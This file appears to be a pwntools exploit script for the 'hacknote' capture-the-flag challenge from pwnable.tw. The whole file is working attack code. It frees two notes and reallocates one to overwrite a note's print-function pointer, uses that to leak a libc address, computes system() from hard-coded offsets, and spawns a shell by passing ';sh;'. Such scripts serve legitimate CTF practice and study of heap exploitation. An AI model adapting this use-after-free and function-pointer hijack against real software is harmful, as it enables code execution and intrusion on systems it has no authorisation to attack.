from pwn import *
#p = remote('chall.pwnable.tw',10102)
p = process('./hacknote')
#gdb.attach(p)
def add(size,content):
    p.sendlineafter("Your choice :","1")
    p.sendlineafter("Note size :",str(size))
    p.sendlineafter("Content :",str(content))

def delete(idx):
    p.sendlineafter("Your choice :","2")
    p.sendlineafter("Index :",str(idx))

def show(idx):
    p.sendlineafter("Your choice :","3")
    p.sendlineafter("Index :",str(idx))

add(32,"a"*32)
add(32,"b"*32)
delete(0)
delete(1)
add(8,p32(0x804862B) + p32(0x0804a010))
show(0)
leak = u32(p.recv(4))
print hex(leak)
'''
system = leak - 0xe6e0
binsh = leak + 0x10fe6b
'''
libc_main = leak - 0x512d0
system = libc_main + 0x3d200

#one = libc_main
delete(2)
add(8,p32(system) + b';sh;')
gdb.attach(p)
show(0)
p.interactive()
